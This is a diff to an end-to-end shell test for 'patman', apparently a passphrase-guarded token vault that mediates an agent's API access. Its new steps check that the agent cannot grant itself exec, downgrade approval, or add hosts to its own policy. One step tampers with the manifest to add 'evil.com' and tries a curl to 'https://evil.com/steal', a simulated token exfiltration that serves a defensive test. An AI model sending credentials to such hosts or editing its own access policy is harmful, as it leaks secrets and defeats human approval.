@@ -7,6 +7,9 @@ PATMAN="${PATMAN:-$SCRATCH/../../target/debug/patman}"
 PTY="python3 $SCRATCH/ptyrun.py"
 
 export HOME="/tmp/pm-e2e"
+# Approval goes through the passphrase path, not a Touch ID dialog, so this runs
+# unattended on macOS too. The unlock agent inherits it from `patman unlock`.
+export PATMAN_NO_TOUCHID=1
 rm -rf "$HOME"; mkdir -p "$HOME"
 
 PASS="correct-horse-battery"
@@ -99,7 +102,13 @@ else
   bad "exec should have been refused, got: $out"
 fi
 
-"$PATMAN" describe localecho --allow-exec >/dev/null
+out=$("$PATMAN" describe localecho --allow-exec 2>&1)
+if grep -q "needs the vault passphrase" <<<"$out"; then
+  ok "the agent cannot opt a service into exec itself"
+else
+  bad "describe --allow-exec should need the passphrase, got: $out"
+fi
+$PTY "input hidden)=$PASS" "$PATMAN" describe localecho --allow-exec >/dev/null
 out=$("$PATMAN" exec localecho -- sh -c 'echo $PAT_TOKEN' 2>&1)
 if grep -qF "$TOKEN" <<<"$out"; then
   ok "after --allow-exec, exec works (and hands over the token, as documented)"
@@ -144,7 +153,79 @@ for op in ({"op":"read","service":"github"}, {"op":"show","service":"github"}):
     s.close()
 PY
 
-step "13. lock, then try again"
+step "13. a hand-edited policy is refused, not obeyed"
+python3 - <<'PY2'
+import json, os
+p = os.path.expanduser("~/.pat/manifest.json")
+m = json.load(open(p))
+m["github"]["hosts"].append("evil.com")
+json.dump(m, open(p, "w"), indent=2)
+PY2
+out=$("$PATMAN" curl github -- -sS https://evil.com/steal 2>&1)
+if grep -q "changed without the vault passphrase" <<<"$out"; then
+  ok "tampered manifest refused: $(head -1 <<<"$out" | cut -c1-80)..."
+else
+  bad "expected a policy refusal, got: $out"
+fi
+python3 - <<'PY2'
+import json, os
+p = os.path.expanduser("~/.pat/manifest.json")
+m = json.load(open(p))
+m["github"]["hosts"].remove("evil.com")
+json.dump(m, open(p, "w"), indent=2)
+PY2
+
+step "14. hybrid: a request-approval service needs a yes for every call"
+$PTY "input hidden)=$PASS" "$PATMAN" describe localecho --approval request | grep -q "Policy signed" \
+  && ok "localecho switched to --approval request (signed)" || bad "could not set --approval request"
+out=$("$PATMAN" describe localecho --approval session 2>&1)
+grep -q "needs the vault passphrase" <<<"$out" && ok "the agent cannot downgrade it back to session" \
+  || bad "approval downgrade without passphrase: $out"
+
+out=$("$PATMAN" curl localecho -- -sS http://127.0.0.1:8731/api 2>&1)
+if grep -q "needs approval for every request" <<<"$out"; then
+  ok "session open, but no approval: refused"
+else
+  bad "expected an approval refusal, got: $out"
+fi
+
+out=$($PTY "approve (input hidden)=$PASS" "$PATMAN" curl localecho -- -sS http://127.0.0.1:8731/api 2>&1)
+if grep -qF "Bearer $TOKEN" <<<"$out" && grep -q "GET http://127.0.0.1:8731/api" <<<"$out"; then
+  ok "approved with the passphrase after seeing the request; the token reached curl"
+else
+  bad "approved request failed: $out"
+fi
+
+out=$($PTY "approve (input hidden)=wrong-passphrase" "$PATMAN" curl localecho -- -sS http://127.0.0.1:8731/api 2>&1)
+grep -q "wrong passphrase" <<<"$out" && ok "a wrong passphrase approves nothing" || bad "wrong passphrase: $out"
+
+python3 - <<'PY2'
+import json, os, socket, struct
+s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+s.connect(os.path.expanduser("~/.pat/agent.sock"))
+req = {"op": "curl", "service": "localecho", "auth": "auto",
+       "args": ["-sS", "http://127.0.0.1:8731/api"]}
+s.sendall((json.dumps(req) + "\n").encode())
+while True:
+    hdr = s.recv(5)
+    if len(hdr) < 5: print("  raw client: connection closed"); break
+    ln = struct.unpack(">I", hdr[1:5])[0]
+    payload = b""
+    while len(payload) < ln: payload += s.recv(ln - len(payload))
+    if hdr[0] == 4:
+        print("  raw client, no approval -> DAEMON REFUSED:", payload.decode()[:70].replace("\n", " ")); break
+    if hdr[0] == 3:
+        print("  raw client, no approval -> ALLOWED (FAIL)"); break
+PY2
+
+out=$("$PATMAN" curl github -- -sS https://127.0.0.1:1/ 2>&1)
+if ! grep -q "approval" <<<"$out"; then
+  ok "a session-approval service still runs unattended (curl itself failed to connect, as expected)"
+else
+  bad "github should not need approval: $out"
+fi
+
+step "15. lock, then try again"
 "$PATMAN" lock | sed 's/^/  /'
 sleep 0.3
 out=$("$PATMAN" curl localecho -- -sS http://127.0.0.1:8731/api 2>&1)
@@ -155,7 +236,7 @@ else
 fi
 if [ -S "$HOME/.pat/agent.sock" ]; then bad "socket left behind"; else ok "socket cleaned up"; fi
 
-step "14. permissions"
+step "16. permissions"
 ls -la "$HOME/.pat" | sed 's/^/  /'
 
 kill $SERVER 2>/dev/null
